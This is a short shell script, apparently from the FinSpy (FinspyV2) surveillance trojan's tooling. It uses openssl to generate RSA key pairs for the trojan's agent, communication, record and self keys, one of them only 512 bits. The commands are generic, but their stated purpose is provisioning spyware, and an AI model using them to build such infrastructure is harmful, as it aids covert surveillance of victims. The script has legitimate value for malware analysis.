#
# Scriptfile to generate a new set of Master Crypto Keys
# for FinspyV2
#

cd ./certs

openssl genrsa -out trojan-agent-key.sec.pem 2048
openssl rsa -inform  PEM  -in trojan-agent-key.sec.pem \
            -outform DER -out trojan-agent-key.sec
openssl rsa -inform  DER  -in trojan-agent-key.sec \
            -pubout \
            -outform DER -out trojan-agent-key.pub
rm trojan-agent-key.sec.pem

openssl genrsa -out trojan-communication-key.sec.pem 2048
openssl rsa -inform  PEM  -in trojan-communication-key.sec.pem \
            -outform DER -out trojan-communication-key.sec
openssl rsa -inform  DER  -in trojan-communication-key.sec \
            -pubout \
            -outform DER -out trojan-communication-key.pub
rm trojan-communication-key.sec.pem


openssl genrsa -out trojan-record-key.sec.pem 2048
openssl rsa -inform  PEM  -in trojan-record-key.sec.pem\
            -outform DER -out trojan-record-key.sec
openssl rsa -inform  DER  -in trojan-record-key.sec \
            -pubout \
            -outform DER -out trojan-record-key.pub
rm trojan-record-key.sec.pem


openssl genrsa -out trojan-self-key.sec.pem 512
openssl rsa -inform  PEM  -in trojan-self-key.sec.pem \
            -outform DER -out trojan-self-key.sec
rm trojan-self-key.sec.pem

cd ..
